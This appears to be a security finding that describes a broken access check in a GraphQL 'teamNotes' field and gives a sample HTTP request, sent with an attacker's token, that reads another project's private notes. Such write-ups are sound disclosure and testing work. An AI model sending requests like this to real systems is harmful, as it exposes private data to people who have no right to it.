diagnosis: The team_notes GraphQL field returns internal notes for a given project_id without checking whether the requesting user is a registered member or collaborator on that project. Any user who discovers or guesses a project UUID can extract all private planning notes and architectural discussions.
exploit_request:
POST /graphql HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"query": "query { teamNotes(projectId: \"prj_secret_roadmap\") { id title content author } }"}
